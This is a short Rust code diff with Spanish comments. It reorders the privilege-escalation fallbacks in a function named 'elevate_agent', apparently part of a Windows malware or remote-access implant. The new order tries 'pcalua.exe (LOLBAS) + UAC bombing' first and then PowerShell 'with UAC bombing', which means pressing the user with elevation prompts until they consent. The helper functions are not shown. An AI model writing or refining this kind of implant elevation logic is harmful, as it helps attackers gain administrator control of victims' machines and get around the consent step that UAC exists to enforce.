@@ -477,22 +477,17 @@ fn elevate_agent() -> String {
     };
     
     // Elevar el ejecutable desde su ubicación actual (SIN copiar)
-    // TÉCNICA 1: Intentar PowerShell primero
-    let ps_result = elevate_agent_via_powershell(exe_str);
-    
-    // Si PowerShell funcionó (SUCCESS), retornar
-    if ps_result.contains("__SUCCESS__") {
-        return ps_result;
-    }
-    
-    debug_print!("DEBUG: PowerShell elevation failed, trying VBScript...");
-    
-    // TÉCNICA 2: VBScript como fallback
+    // TÉCNICA 1: Intentar pcalua.exe (LOLBAS) + UAC bombing primero
     if let Ok(result) = elevate_agent_via_vbs(exe_str) {
         return result;
     }
     
-    // Si ambas técnicas fallaron, retornar el error de PowerShell
+    debug_print!("DEBUG: pcalua.exe elevation failed, trying PowerShell fallback...");
+    
+    // TÉCNICA 2: PowerShell directo con UAC bombing como fallback
+    let ps_result = elevate_agent_via_powershell(exe_str);
+    
+    // Retornar resultado de PowerShell (éxito o error)
     ps_result
 }
 
